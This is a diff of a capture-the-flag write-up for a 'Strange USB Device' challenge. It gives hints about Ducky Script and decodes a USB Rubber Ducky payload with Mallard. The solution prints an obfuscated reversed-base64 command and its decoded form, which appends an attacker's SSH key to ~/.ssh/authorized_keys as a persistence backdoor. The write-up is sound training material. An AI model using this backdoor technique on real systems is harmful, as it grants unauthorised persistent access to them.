@@ -4,16 +4,16 @@
 Difficulty: :christmas_tree::christmas_tree:   
 Assist the elves in reverse engineering the strange USB device. Visit Santa's Talks Floor and hit up Jewel Loggins for advice.
 
-## 5.1. Side Challenge - Logic Munchers
+## 5.1. [Side Challenge - IPv6 Sandbox](/05.%20Strange%20USB%20Device/05.01.%20Side%20Challenge%20-%20IPv6%20Sandbox/README.md)
 
 ## 5.2. Hints
-**Mitre ATT&CK™ and Ducky** - *Jewel Loggins*: “The [MITRE ATT&CK™ tactic T1098.004](https://attack.mitre.org/techniques/T1098/004/) describes SSH persistence techniques through authorized keys files.”
-**Ducky RE with Mallard** - *Jewel Loggins*: “It's also possible the reverse engineer encoded Ducky Script using [Mallard](https://github.com/dagonis/Mallard).”
-**Duck Encoder** - *Jewel Loggins*: “Attackers can encode Ducky Script using a [duck encoder](https://docs.hak5.org/hc/en-us/articles/360010471234-Writing-your-first-USB-Rubber-Ducky-Payload) for delivery as inject.bin.”
-**Ducky Script** - *Jewel Loggins*: “[Ducky Script](https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language) is the language for the USB Rubber Ducky”
+**Mitre ATT&CK™ and Ducky** - *Jewel Loggins*: “The [MITRE ATT&CK™ tactic T1098.004](https://attack.mitre.org/techniques/T1098/004/) describes SSH persistence techniques through authorized keys files.”  
+**Ducky RE with Mallard** - *Jewel Loggins*: “It's also possible the reverse engineer encoded Ducky Script using [Mallard](https://github.com/dagonis/Mallard).”  
+**Duck Encoder** - *Jewel Loggins*: “Attackers can encode Ducky Script using a [duck encoder](https://docs.hak5.org/hc/en-us/articles/360010471234-Writing-your-first-USB-Rubber-Ducky-Payload) for delivery as inject.bin.”  
+**Ducky Script** - *Jewel Loggins*: “[Ducky Script](https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language) is the language for the USB Rubber Ducky”  
 
 ## 5.3. Solution
-By analyzing file `/mnt/USBDEVICE/inject.bin` with `mallard.py` it’s possible to spot a base64 encoded string that gets reversed and executed:
+By analyzing file `/mnt/USBDEVICE/inject.bin` with `mallard.py` it’s possible to spot a `base64` encoded string that gets reversed and executed:
 ```bash
 elf@8a0e085afabf:~$ python mallard.py --file /mnt/USBDEVICE/inject.bin
 ```
@@ -90,7 +90,7 @@ DELAY 600
 GUI q
 ```
 
-This string decoded shows a backdoor implant in the system with user ickymcgoop@trollfun.jackfrosttower.com:
+This string decoded shows a backdoor implant in the system with user `ickymcgoop@trollfun.jackfrosttower.com`:
 ```bash
 elf@8a0e085afabf:~$ echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d 
 echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
